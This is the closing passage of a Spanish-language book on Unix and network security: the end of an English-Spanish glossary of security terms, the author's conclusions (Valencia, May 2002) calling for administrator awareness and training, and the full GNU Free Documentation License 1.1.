     </para></section>

     <!--l. 110--><para>Rabbit Programs: Programas conejo.
     <!--br/-->Race Conditions: Condiciones de carrera.
     <!--br/-->Reliability: Con&#xFB01;abilidad.
     <!--br/-->Replay attack: Ataque por reenv&#x02CA;&#x0131;o o reproducci&#x00F3;n.
     <!--br/-->Round down: Redondeo hacia abajo.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 115--><para> &#x2013; S &#x2013;
     </para></section>
     <!--l. 118--><para>Safety: Seguridad (entendida como tolerancia a fallos).
     <!--br/-->Scavenging: Basureo.
     <!--br/-->Security policy: Pol&#x02CA;&#x0131;tica de seguridad.
     <!--br/-->Security: Seguridad.
     <!--br/-->Shadow Password: Oscurecimiento de contrase~nas.
     <!--br/-->Snooping: Fisgoneo.
     <!--br/-->Social Engineering: Ingenier&#x02CA;&#x0131;a Social.
     <!--br/-->Source Routing: Encaminamiento en origen.
     <!--br/-->Source Suppressed: Fuente eliminada.
     <!--br/-->Spoo&#xFB01;ng: Falseamiento, enmascaramiento.
     <!--br/-->Stack Smashing: Desbordamiento de pila.
     <!--br/-->Sticky bit: Bit de permanencia.
     <!--br/-->System Integrity Veri&#xFB01;er: Veri&#xFB01;cador de integridad del sistema (SIV).
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 131--><para> &#x2013; T &#x2013;
     </para></section>
     <!--l. 134--><para>Tampering: Adulteraci&#x00F3;n.
     <!--br/-->Threat: Amenaza.
     <!--br/-->Tiger Team: Grupo o equipo Tigre.
     <!--br/-->Token authentication: Autenticaci&#x00F3;n por testigo.
     <!--br/-->Trap Door: Puerta Trasera.
     <!--br/-->Trashing: Basureo.
     <!--br/-->Trojan Horse: Caballo de Troya.
     <!--br/-->Trojan Mule: Mula de Troya.
     <!--br/-->Trusted Communication Path: Ruta de comunicaci&#x00F3;n &#xFB01;able (TCP).
     <!--br/-->Trusted Computing Base: Base segura o &#xFB01;able de c&#x00F3;mputo (TCB).
     <!--br/-->Trusted Unix: Unix &#xFB01;able.
     <!--br/-->Trustworthiness: Fiabilidad.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 146--><para> &#x2013; U &#x2013;
     </para></section>
     <!--l. 149--><para>Uninterruptible Power Supplies (UPS): Servicio de Alimentaci&#x00F3;n Ininterrumpido
     (SAI).
     <!--br/-->User Identi&#xFB01;er: Identi&#xFB01;cador de usuario (UID).
     <!--br/-->
     </para><section role="center"><title/>

     <!--l. 151--><para> &#x2013; V &#x2013;
     </para></section>
     <!--l. 154--><para>Virtual Private Network: Red Privada Virtual (VPN).
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 155--><para> &#x2013; W &#x2013;
     </para></section>
     <!--l. 158--><para>Wiretapping: Interceptaci&#x00F3;n.
     <!--br/-->Worm: Gusano.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 160--><para> &#x2013; Z &#x2013;
     </para></section>
     <!--l. 163--><para>Zeroization: Puesta a cero.
     <!--br/-->



     </para><!--l. 141--><para>


     </para><!--l. 1--><para>

     </para><!--l. 1--><para><anchor 
   id="x1-362000D"  ></anchor>Conclusiones Si despu&#x00E9;s de aproximadamente 500 hojas de trabajo, con m&#x00E1;s de 300 referencias
     bibliogr&#x00E1;&#xFB01;cas citadas, a&#x00FA;n hay alguien que considere a Unix un sistema inseguro existen dos opciones: o
     se equivoca &#x00E9;l o me equivoco yo. Seguramente que me equivoque yo no ser&#x02CA;&#x0131;a dif&#x02CA;&#x0131;cil; lo realmente
     extra~no es que se hayan equivocado todos los expertos que durante a~nos &#x2013; algunos desde antes de
     que muchos de nosotros hubi&#x00E9;ramos nacido &#x2013; han venido aportando su tiempo, su talento y sus
     conocimientos al mundo de la seguridad inform&#x00E1;tica (por supuesto, hablo de expertos de
     verdad, no de hackers, crackers, o como ahora se quiera llamar a los piratas), una materia
     que d&#x02CA;&#x0131;a a d&#x02CA;&#x0131;a va demostrando su importancia en todo tipo de organizaciones. Como es
     bastante dif&#x02CA;&#x0131;cil que toda esta gente se haya equivocado, ser&#x02CA;&#x0131;a conveniente que el que a&#x00FA;n a
     estas alturas dude de las posibilidades de Unix (en cuanto a seguridad se re&#xFB01;ere, aunque
     podr&#x02CA;&#x0131;amos hablar de posibilidades en general) con respecto a otros sistemas se replantee sus
     ideas.
     <!--br/-->
     <!--br/-->En este proyecto se han revisado las bases m&#x00E1;s importantes de la seguridad en Unix y redes;
     evidentemente, muchas cosas se han quedado en el tintero, y otras muchas no han sido comentadas
     con la profundidad que sin duda merecen. Se han intentado ofrecer ejemplos aplicados a entornos
     que no precisan de una alta seguridad, pero s&#x02CA;&#x0131; de una seguridad m&#x02CA;&#x0131;nima, como es el caso de las
     redes de I+D, las de medianas empresas, y las de ISPs. El trabajo se ha dividido en seis
     grandes partes; en la primera (seguridad del entorno de operaciones) se habla de las
     implicaciones de seguridad (e inseguridad) relacionadas con la simple existencia de un sistema,
     Unix o no, en un entorno de trabajo: su ubicaci&#x00F3;n f&#x02CA;&#x0131;sica, las personas que le rodean&#x2026;Una
     segunda parte es la relacionada con la seguridad de la m&#x00E1;quina en s&#x02CA;&#x0131;, sin conexi&#x00F3;n a red, y
     todos los problemas que nos podemos encontrar en esta situaci&#x00F3;n, y la tercera habla de
     peculiaridades tambi&#x00E9;n a nivel de host de diferentes clones de Unix; como los sistemas
     aislados son cada d&#x02CA;&#x0131;a m&#x00E1;s extra~nos, la cuarta parte (seguridad de la subred) introduce
     algunos de los peligros (y sus soluciones) que no exist&#x02CA;&#x0131;an en m&#x00E1;quinas sin conectar a
     una red. A continuaci&#x00F3;n, una quinta parte habla de otros aspectos relacionados con la
     seguridad de un equipo, algunos de los cuales son las bases para comprender muchas de las
     cosas que se explican en el trabajo (por ejemplo, la criptolog&#x02CA;&#x0131;a). Para terminar, en la
     sexta parte del proyecto, ya como ap&#x00E9;ndices, se presenta un escueto resumen de normas
     de seguridad a modo de &#x2018;receta de cocina&#x2019; para administradores, algunas normativas
     vigentes en Espa~na relacionadas con los sistemas inform&#x00E1;ticos y su (in)seguridad, una
     referencia de recursos relacionados con esta materia en Internet, y &#xFB01;nalmente un peque~no
     glosario de t&#x00E9;rminos anglosajones utilizados con frecuencia en el mundo de la seguridad en
     Unix.
     <!--br/-->
     <!--br/-->A pesar del elevado nivel de seguridad que Unix puede ofrecer (al menos espero que haya quedado
     patente que Unix es el sistema operativo de prop&#x00F3;sito general m&#x00E1;s seguro hoy en d&#x02CA;&#x0131;a) cualquiera que
     se diera una vuelta, f&#x02CA;&#x0131;sica o virtual, por la mayor&#x02CA;&#x0131;a de entornos &#x2018;normales&#x2019; en Espa~na
     podr&#x02CA;&#x0131;a comprobar que su seguridad es en la mayor parte de los casos pobre, cuando no
     inexistente. Si Unix es te&#x00F3;ricamente tan seguro, &#x00BF;por qu&#x00E9; en la pr&#x00E1;ctica cualquier aprendiz
     de pirata es capaz de &#x2018;colarse&#x2019; en servidores de todo tipo?, &#x00BF;d&#x00F3;nde est&#x00E1; el problema? El
     problema no radica en Unix: radica en las personas que est&#x00E1;n detr&#x00E1;s del sistema operativo,
     generalmente administradores y usuarios de cualquier categor&#x02CA;&#x0131;a. Unix ofrece los mecanismos
     su&#xFB01;cientes como para conseguir un nivel de seguridad m&#x00E1;s que aceptable, pero somos
     nosotros los que en muchos casos no sabemos aprovecharlos. Para solucionar el problema,
     como ya hemos comentado a lo largo del proyecto, existen dos soluciones que todos
     deber&#x02CA;&#x0131;amos intentar aplicar: en primer lugar la concienciaci&#x00F3;n de los problemas que nos
     pueden acarrear los fallos de seguridad (a muchos a&#x00FA;n les parece que el tema no va con
     ellos, que los piratas inform&#x00E1;ticos s&#x00F3;lo existen en el cine, y que en su m&#x00E1;quina nada malo
     puede ocurrir). Tras la concienciaci&#x00F3;n, es necesaria una formaci&#x00F3;n adecuada a cada tipo de
     persona (evidentemente no podemos exigir los mismos conocimientos a un administrador
     responsable de varias m&#x00E1;quinas que a un usuario que s&#x00F3;lo conecta al sistema para lanzar
     simulaciones); no es necesario convertirse en un experto, simplemente hay que leer un poco y
     conocer unas normas b&#x00E1;sicas (por ejemplo, las presentadas en el ap&#x00E9;ndice A&#x2026;si alguien
     argumenta que no tiene tiempo para leer quince hojas, seguramente est&#x00E1; mintiendo). Con
     estos dos pasos seguramente no pararemos a todos los piratas que nos intenten atacar,

     pero s&#x02CA;&#x0131; a la gran mayor&#x02CA;&#x0131;a de ellos, que es lo que realmente interesa en el mundo de la
     seguridad.
     <!--br/-->
     <!--br/-->Aparte del l&#x00F3;gico incremento en el nivel de seguridad que se conseguir&#x02CA;&#x0131;a mediante una m&#x02CA;&#x0131;nima
     concienciaci&#x00F3;n y formaci&#x00F3;n de los usuarios de Unix, existe un escollo que estas dos medidas dif&#x02CA;&#x0131;cilmente
     nos van a permitir superar: la simpat&#x02CA;&#x0131;a que socialmente despiertan muchos piratas inform&#x00E1;ticos; por
     desgracia, mucha gente a&#x00FA;n considera a estos personajes una especie de h&#x00E9;roes. Si nadie
     aplaude al que roba un bolso en la calle, &#x00BF;por qu&#x00E9; a&#x00FA;n existen defensores de los que roban
     contrase~nas de un sistema? Mientras sigamos sin darnos cuenta de lo que realmente son los
     piratas (simplemente delincuentes) ser&#x00E1; dif&#x02CA;&#x0131;cil que la seguridad inform&#x00E1;tica sea tomada en
     serio.
     <!--br/-->
     <!--br/-->No me gustar&#x02CA;&#x0131;a acabar este trabajo sin una peque~na re&#xFB02;exi&#x00F3;n sobre el panorama de la seguridad en
     Unix y redes que existe actualmente en Espa~na; s&#x00F3;lo cabe una de&#xFB01;nici&#x00F3;n: lamentable. Lo &#x00FA;nico
     que por suerte se toma en serio es la criptograf&#x02CA;&#x0131;a, que cuenta con grupos de estudio y
     docencia en algunas universidades del pa&#x02CA;&#x0131;s. Del resto, casi es mejor no hablar: no existe
     ning&#x00FA;n grupo importante de investigaci&#x00F3;n en ninguna universidad espa~nola, el n&#x00FA;mero de
     art&#x02CA;&#x0131;culos publicados en revistas serias se reduce a cero, y la docencia universitaria a
     unas pocas asignaturas gen&#x00E9;ricas &#x2013; y que ni siquiera son obligatorias &#x2013;; por supuesto, no
     existe ning&#x00FA;n programa de doctorado relacionado con la materia (excepto, una vez m&#x00E1;s, y
     afortunadamente, con la criptograf&#x02CA;&#x0131;a). De esta forma, si la mayor parte de los inform&#x00E1;ticos salen de
     las facultades sin conocer conceptos tan b&#x00E1;sicos como sni&#xFB00;er o caballo de Troya (ya no
     hablamos de cosas como esteganograf&#x02CA;&#x0131;a o seguridad multinivel), no es de extra~nar que
     la seguridad se encuentre actualmente (en la mayor parte de los casos) en manos de
     a&#xFB01;cionados a la inform&#x00E1;tica con ciertos conocimientos pr&#x00E1;cticos pero con una importante falta de
     bases te&#x00F3;ricas sobre la materia. Si lo que queremos son sistemas inseguros y reportajes
     sensacionalistas sobre quincea~neros que violan la seguridad de La Moncloa, lo estamos
     consiguiendo&#x2026;pero quiz&#x00E1;s deber&#x02CA;&#x0131;amos plantearnos qu&#x00E9; ha de pasar para que esto cambie.
     <!--br/-->                                                                    Valencia, mayo de 2002


     </para><!--l. 145--><para>


     </para><!--l. 5--><para>

     </para><!--l. 5--><para><anchor 
   id="x1-363000D"  ></anchor>GNU Free Documentation License
     </para><!--l. 7--><para>Version 1.1, March 2000
     <!--br/-->
     </para><!--l. 9--><para>Copyright &#x00A9;&#x00A0;2000 Free Software Foundation, Inc.
     <!--br/-->59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
     <!--br/-->Everyone is permitted to copy and distribute verbatim copies of this license document, but changing
     it is not allowed.
     </para><!--l. 14--><section 
role="likesection"><title><anchor 
   id="x1-364000D"  ></anchor>Preamble</title>
     <!--l. 16--><para>The purpose of this License is to make a manual, textbook, or other written document &#x201C;free&#x201D; in the
     sense of freedom: to assure everyone the e&#xFB00;ective freedom to copy and redistribute it, with or
     without modifying it, either commercially or noncommercially. Secondarily, this License preserves for
     the author and publisher a way to get credit for their work, while not being considered responsible
     for modi&#xFB01;cations made by others.
     </para><!--l. 24--><para>This License is a kind of &#x201C;copyleft&#x201D;, which means that derivative works of the document must
     themselves be free in the same sense. It complements the GNU General Public License, which is a
     copyleft license designed for free software.
     </para><!--l. 29--><para>We have designed this License in order to use it for manuals for free software, because free software
     needs free documentation: a free program should come with manuals providing the same freedoms
     that the software does. But this License is not limited to software manuals; it can be used for
     any textual work, regardless of subject matter or whether it is published as a printed
     book. We recommend this License principally for works whose purpose is instruction or
     reference.
     </para><!--l. 37--><para>
     </para></section><!--end likesection--><!--l. 37--><section 
role="section"><title><abbrev role="title-mark">D.1</abbrev><anchor 
   id="x1-365000D.1"  ></anchor>Applicability and De&#xFB01;nitions</title>
     <!--l. 39--><para>This License applies to any manual or other work that contains a notice placed by the copyright
     holder saying it can be distributed under the terms of this License. The &#x201C;Document&#x201D;, below, refers
     to any such manual or work. Any member of the public is a licensee, and is addressed as
     &#x201C;you&#x201D;.
     </para><!--l. 45--><para>A &#x201C;Modi&#xFB01;ed Version&#x201D; of the Document means any work containing the Document or a
     portion of it, either copied verbatim, or with modi&#xFB01;cations and/or translated into another
     language.
     </para><!--l. 49--><para>A &#x201C;Secondary Section&#x201D; is a named appendix or a front-matter section of the Document that
     deals exclusively with the relationship of the publishers or authors of the Document
     to the Document&#x2019;s overall subject (or to related matters) and contains nothing that
     could fall directly within that overall subject. (For example, if the Document is in part a
     textbook of mathematics, a Secondary Section may not explain any mathematics.) The
     relationship could be a matter of historical connection with the subject or with related
     matters, or of legal, commercial, philosophical, ethical or political position regarding
     them.
     </para><!--l. 60--><para>The &#x201C;Invariant Sections&#x201D; are certain Secondary Sections whose titles are designated, as being those
     of Invariant Sections, in the notice that says that the Document is released under this
     License.
     </para><!--l. 64--><para>The &#x201C;Cover Texts&#x201D; are certain short passages of text that are listed, as Front-Cover Texts
     or Back-Cover Texts, in the notice that says that the Document is released under this
     License.
     </para><!--l. 68--><para>A &#x201C;Transparent&#x201D; copy of the Document means a machine-readable copy, represented in
     a format whose speci&#xFB01;cation is available to the general public, whose contents can be
     viewed and edited directly and straightforwardly with generic text editors or (for images

     composed of pixels) generic paint programs or (for drawings) some widely available drawing
     editor, and that is suitable for input to text formatters or for automatic translation to a
     variety of formats suitable for input to text formatters. A copy made in an otherwise
     Transparent &#xFB01;le format whose markup has been designed to thwart or discourage subsequent
     modi&#xFB01;cation by readers is not Transparent. A copy that is not &#x201C;Transparent&#x201D; is called
     &#x201C;Opaque&#x201D;.
     </para><!--l. 80--><para>Examples of suitable formats for Transparent copies include plain ASCII without markup, Texinfo
     input format, LaTeX&#x00A0;input format, SGML or XML using a publicly available DTD, and
     standard-conforming simple HTML designed for human modi&#xFB01;cation. Opaque formats include
     PostScript, PDF, proprietary formats that can be read and edited only by proprietary word
     processors, SGML or XML for which the DTD and/or processing tools are not generally available,
     and the machine-generated HTML produced by some word processors for output purposes
     only.
     </para><!--l. 90--><para>The &#x201C;Title Page&#x201D; means, for a printed book, the title page itself, plus such following pages as are
     needed to hold, legibly, the material this License requires to appear in the title page. For works in
     formats which do not have any title page as such, &#x201C;Title Page&#x201D; means the text near the most
     prominent appearance of the work&#x2019;s title, preceding the beginning of the body of the
     text.
     </para><!--l. 98--><para>
     </para></section><!--end section--><!--l. 98--><section 
role="section"><title><abbrev role="title-mark">D.2</abbrev><anchor 
   id="x1-366000D.2"  ></anchor>Verbatim Copying</title>
     <!--l. 100--><para>You may copy and distribute the Document in any medium, either commercially or
     noncommercially, provided that this License, the copyright notices, and the license notice
     saying this License applies to the Document are reproduced in all copies, and that you
     add no other conditions whatsoever to those of this License. You may not use technical
     measures to obstruct or control the reading or further copying of the copies you make
     or distribute. However, you may accept compensation in exchange for copies. If you
     distribute a large enough number of copies you must also follow the conditions in section
     3.
     </para><!--l. 110--><para>You may also lend copies, under the same conditions stated above, and you may publicly display
     copies.
     </para><!--l. 114--><para>
     </para></section><!--end section--><!--l. 114--><section 
role="section"><title><abbrev role="title-mark">D.3</abbrev><anchor 
   id="x1-367000D.3"  ></anchor>Copying in Quantity</title>
     <!--l. 116--><para>If you publish printed copies of the Document numbering more than 100, and the Document&#x2019;s license
     notice requires Cover Texts, you must enclose the copies in covers that carry, clearly and legibly,
     all these Cover Texts: Front-Cover Texts on the front cover, and Back-Cover Texts on
     the back cover. Both covers must also clearly and legibly identify you as the publisher
     of these copies. The front cover must present the full title with all words of the title
     equally prominent and visible. You may add other material on the covers in addition.
     Copying with changes limited to the covers, as long as they preserve the title of the
     Document and satisfy these conditions, can be treated as verbatim copying in other
     respects.
     </para><!--l. 128--><para>If the required texts for either cover are too voluminous to &#xFB01;t legibly, you should put the &#xFB01;rst ones
     listed (as many as &#xFB01;t reasonably) on the actual cover, and continue the rest onto adjacent
     pages.
     </para><!--l. 133--><para>If you publish or distribute Opaque copies of the Document numbering more than 100, you must
     either include a machine-readable Transparent copy along with each Opaque copy, or state in or with
     each Opaque copy a publicly-accessible computer-network location containing a complete

     Transparent copy of the Document, free of added material, which the general network-using public
     has access to download anonymously at no charge using public-standard network protocols. If you
     use the latter option, you must take reasonably prudent steps, when you begin distribution
     of Opaque copies in quantity, to ensure that this Transparent copy will remain thus
     accessible at the stated location until at least one year after the last time you distribute
     an Opaque copy (directly or through your agents or retailers) of that edition to the
     public.
     </para><!--l. 147--><para>It is requested, but not required, that you contact the authors of the Document well before
     redistributing any large number of copies, to give them a chance to provide you with an updated
     version of the Document.
     </para><!--l. 152--><para>
     </para></section><!--end section--><!--l. 152--><section 
role="section"><title><abbrev role="title-mark">D.4</abbrev><anchor 
   id="x1-368000D.4"  ></anchor>Modi&#xFB01;cations</title>
     <!--l. 154--><para>You may copy and distribute a Modi&#xFB01;ed Version of the Document under the conditions of sections 2
     and 3 above, provided that you release the Modi&#xFB01;ed Version under precisely this License, with the
     Modi&#xFB01;ed Version &#xFB01;lling the role of the Document, thus licensing distribution and modi&#xFB01;cation of the
     Modi&#xFB01;ed Version to whoever possesses a copy of it. In addition, you must do these things in the
     Modi&#xFB01;ed Version:
     </para><!--l. 161--><para>
          </para><itemizedlist>
          <listitem>
          <!--l. 163--><para>Use in the Title Page (and on the covers, if any) a title distinct from that of the
          Document, and from those of previous versions (which should, if there were any, be
          listed in the History section of the Document). You may use the same title as a previous
          version if the original publisher of that version gives permission.
          </para></listitem>
          <listitem>
          <!--l. 168--><para>List  on  the  Title  Page,  as  authors,  one  or  more  persons  or  entities  responsible  for
          authorship of the modi&#xFB01;cations in the Modi&#xFB01;ed Version, together with at least &#xFB01;ve of
          the principal authors of the Document (all of its principal authors, if it has less than
          &#xFB01;ve).
          </para></listitem>
          <listitem>
          <!--l. 172--><para>State on the Title page the name of the publisher of the Modi&#xFB01;ed Version, as the
          publisher.
          </para></listitem>
          <listitem>
          <!--l. 174--><para>Preserve all the copyright notices of the Document.
          </para></listitem>
          <listitem>
          <!--l. 175--><para>Add  an  appropriate  copyright  notice  for  your  modi&#xFB01;cations  adjacent  to  the  other
          copyright notices.
          </para></listitem>
          <listitem>
          <!--l. 177--><para>Include,  immediately  after  the  copyright  notices,  a  license  notice  giving  the  public
          permission to use the Modi&#xFB01;ed Version under the terms of this License, in the form
          shown in the Addendum below.

          </para></listitem>
          <listitem>
          <!--l. 180--><para>Preserve in that license notice the full lists of Invariant Sections and required Cover
          Texts given in the Document&#x2019;s license notice.
          </para></listitem>
          <listitem>
          <!--l. 182--><para>Include an unaltered copy of this License.
          </para></listitem>
          <listitem>
          <!--l. 183--><para>Preserve the section entitled &#x201C;History&#x201D;, and its title, and add to it an item stating at
          least the title, year, new authors, and publisher of the Modi&#xFB01;ed Version as given on the
          Title Page. If there is no section entitled &#x201C;History&#x201D; in the Document, create one stating
          the title, year, authors, and publisher of the Document as given on its Title Page, then
          add an item describing the Modi&#xFB01;ed Version as stated in the previous sentence.
          </para></listitem>
          <listitem>
          <!--l. 190--><para>Preserve the network location, if any, given in the Document for public access to a
          Transparent copy of the Document, and likewise the network locations given in the
          Document for previous versions it was based on. These may be placed in the &#x201C;History&#x201D;
          section. You may omit a network location for a work that was published at least four
          years before the Document itself, or if the original publisher of the version it refers to
          gives permission.
          </para></listitem>
          <listitem>
          <!--l. 197--><para>In any section entitled &#x201C;Acknowledgements&#x201D; or &#x201C;Dedications&#x201D;, preserve the section&#x2019;s
          title, and preserve in the section all the substance and tone of each of the contributor
          acknowledgements and/or dedications given therein.
          </para></listitem>
          <listitem>
          <!--l. 201--><para>Preserve all the Invariant Sections of the Document, unaltered in their text and in their
          titles. Section numbers or the equivalent are not considered part of the section titles.
          </para></listitem>
          <listitem>
          <!--l. 204--><para>Delete any section entitled &#x201C;Endorsements&#x201D;. Such a section may not be included in the
          Modi&#xFB01;ed Version.
          </para></listitem>
          <listitem>
          <!--l. 206--><para>Do not retitle any existing section as &#x201C;Endorsements&#x201D; or to con&#xFB02;ict in title with any
          Invariant Section.
          </para></listitem></itemizedlist>
     <!--l. 211--><para>If the Modi&#xFB01;ed Version includes new front-matter sections or appendices that qualify as Secondary
     Sections and contain no material copied from the Document, you may at your option designate some
     or all of these sections as invariant. To do this, add their titles to the list of Invariant Sections in the
     Modi&#xFB01;ed Version&#x2019;s license notice. These titles must be distinct from any other section
     titles.
     </para><!--l. 218--><para>You may add a section entitled &#x201C;Endorsements&#x201D;, provided it contains nothing but endorsements of
     your Modi&#xFB01;ed Version by various parties &#x2013; for example, statements of peer review or
     that the text has been approved by an organization as the authoritative de&#xFB01;nition of a
     standard.

     </para><!--l. 224--><para>You may add a passage of up to &#xFB01;ve words as a Front-Cover Text, and a passage of up to 25 words
     as a Back-Cover Text, to the end of the list of Cover Texts in the Modi&#xFB01;ed Version.
     Only one passage of Front-Cover Text and one of Back-Cover Text may be added by (or
     through arrangements made by) any one entity. If the Document already includes a
     cover text for the same cover, previously added by you or by arrangement made by
     the same entity you are acting on behalf of, you may not add another; but you may
     replace the old one, on explicit permission from the previous publisher that added the old
     one.
     </para><!--l. 234--><para>The author(s) and publisher(s) of the Document do not by this License give permission to
     use their names for publicity for or to assert or imply endorsement of any Modi&#xFB01;ed
     Version.
     </para><!--l. 239--><para>
     </para></section><!--end section--><!--l. 239--><section 
role="section"><title><abbrev role="title-mark">D.5</abbrev><anchor 
   id="x1-369000D.5"  ></anchor>Combining Documents</title>
     <!--l. 241--><para>You may combine the Document with other documents released under this License,
     under the terms de&#xFB01;ned in section 4 above for modi&#xFB01;ed versions, provided that you
     include in the combination all of the Invariant Sections of all of the original documents,
     unmodi&#xFB01;ed, and list them all as Invariant Sections of your combined work in its license
     notice.
     </para><!--l. 248--><para>The combined work need only contain one copy of this License, and multiple identical
     Invariant Sections may be replaced with a single copy. If there are multiple Invariant
     Sections with the same name but di&#xFB00;erent contents, make the title of each such section
     unique by adding at the end of it, in parentheses, the name of the original author or
     publisher of that section if known, or else a unique number. Make the same adjustment to
     the section titles in the list of Invariant Sections in the license notice of the combined
     work.
     </para><!--l. 257--><para>In the combination, you must combine any sections entitled &#x201C;History&#x201D; in the various original
     documents, forming one section entitled &#x201C;History&#x201D;; likewise combine any sections entitled
     &#x201C;Acknowledgements&#x201D;, and any sections entitled &#x201C;Dedications&#x201D;. You must delete all sections entitled
     &#x201C;Endorsements.&#x201D;
     </para><!--l. 264--><para>
     </para></section><!--end section--><!--l. 264--><section 
role="section"><title><abbrev role="title-mark">D.6</abbrev><anchor 
   id="x1-370000D.6"  ></anchor>Collections of Documents</title>
     <!--l. 266--><para>You may make a collection consisting of the Document and other documents released under this
     License, and replace the individual copies of this License in the various documents with a single copy
     that is included in the collection, provided that you follow the rules of this License for verbatim
     copying of each of the documents in all other respects.
     </para><!--l. 272--><para>You may extract a single document from such a collection, and distribute it individually under this
     License, provided you insert a copy of this License into the extracted document, and follow this
     License in all other respects regarding verbatim copying of that document.
     </para><!--l. 279--><para>
     </para></section><!--end section--><!--l. 279--><section 
role="section"><title><abbrev role="title-mark">D.7</abbrev><anchor 
   id="x1-371000D.7"  ></anchor>Aggregation With Independent Works</title>
     <!--l. 281--><para>A compilation of the Document or its derivatives with other separate and independent documents
     or works, in or on a volume of a storage or distribution medium, does not as a whole
     count as a Modi&#xFB01;ed Version of the Document, provided no compilation copyright is
     claimed for the compilation. Such a compilation is called an &#x201C;aggregate&#x201D;, and this License

     does not apply to the other self-contained works thus compiled with the Document, on
     account of their being thus compiled, if they are not themselves derivative works of the
     Document.
     </para><!--l. 290--><para>If the Cover Text requirement of section 3 is applicable to these copies of the Document, then if the
     Document is less than one quarter of the entire aggregate, the Document&#x2019;s Cover Texts may be
     placed on covers that surround only the Document within the aggregate. Otherwise they must
     appear on covers around the whole aggregate.
     </para><!--l. 297--><para>
     </para></section><!--end section--><!--l. 297--><section 
role="section"><title><abbrev role="title-mark">D.8</abbrev><anchor 
   id="x1-372000D.8"  ></anchor>Translation</title>
     <!--l. 299--><para>Translation is considered a kind of modi&#xFB01;cation, so you may distribute translations of the Document
     under the terms of section 4. Replacing Invariant Sections with translations requires special
     permission from their copyright holders, but you may include translations of some or all Invariant
     Sections in addition to the original versions of these Invariant Sections. You may include a
     translation of this License provided that you also include the original English version of this License.
     In case of a disagreement between the translation and the original English version of this License,
     the original English version will prevail.
     </para><!--l. 311--><para>
     </para></section><!--end section--><!--l. 311--><section 
role="section"><title><abbrev role="title-mark">D.9</abbrev><anchor 
   id="x1-373000D.9"  ></anchor>Termination</title>
     <!--l. 313--><para>You may not copy, modify, sublicense, or distribute the Document except as expressly provided for
     under this License. Any other attempt to copy, modify, sublicense or distribute the Document is
     void, and will automatically terminate your rights under this License. However, parties who have
     received copies, or rights, from you under this License will not have their licenses terminated so long
     as such parties remain in full compliance.
     </para><!--l. 322--><para>
     </para></section><!--end section--><!--l. 322--><section 
role="section"><title><abbrev role="title-mark">D.10</abbrev><anchor 
   id="x1-374000D.10"  ></anchor>Future Revisions of This License</title>
     <!--l. 324--><para>The Free Software Foundation may publish new, revised versions of the GNU Free Documentation
     License from time to time. Such new versions will be similar in spirit to the present version, but may
     di&#xFB00;er in detail to address new problems or concerns. See http://www.gnu.org/copyleft/.
     </para><!--l. 330--><para>Each version of the License is given a distinguishing version number. If the Document speci&#xFB01;es that
     a particular numbered version of this License r any later versionpplies to it, you have the option of
     following the terms and conditions either of that speci&#xFB01;ed version or of any later version that has
     been published (not as a draft) by the Free Software Foundation. If the Document does not specify a
     version number of this License, you may choose any version ever published (not as a draft) by the
     Free Software Foundation.
     </para><!--l. 339--><para>
     </para></section><!--end section--><!--l. 339--><section 
role="likesection"><title><anchor 
   id="x1-375000D.10"  ></anchor>ADDENDUM: How to use this License for your documents</title>
     <!--l. 341--><para>To use this License in a document you have written, include a copy of the License in
     the document and put the following copyright and license notices just after the title
     page:
     </para><!--l. 345--><para>

          </para><!--l. 347--><para>Copyright  &#x00A9;&#x00A0;YEAR  YOUR  NAME.  Permission  is  granted  to  copy,  distribute
          and/or modify this document under the terms of the GNU Free Documentation
          License,  Version  1.1  or  any  later  version  published  by  the  Free  Software
          Foundation; with the Invariant Sections being LIST THEIR TITLES, with the
          Front-Cover Texts being LIST, and with the Back-Cover Texts being LIST. A
          copy of the license is included in the section entitled &#x201C;GNU Free Documentation
          License&#x201D;.
     </para><!--l. 358--><para>If you have no Invariant Sections, write &#x201C;with no Invariant Sections&#x201D; instead of saying which ones
     are invariant. If you have no Front-Cover Texts, write &#x201C;no Front-Cover Texts&#x201D; instead of
     &#x201C;Front-Cover Texts being LIST&#x201D;; likewise for Back-Cover Texts.
     </para><!--l. 363--><para>If your document contains nontrivial examples of program code, we recommend releasing these
     examples in parallel under your choice of free software license, such as the GNU General Public
     License, to permit their use in free software.
     </para></section><!--end likesection--></section><!--end part--></section><!--end chapter--></section><!--end likechapter--></article>


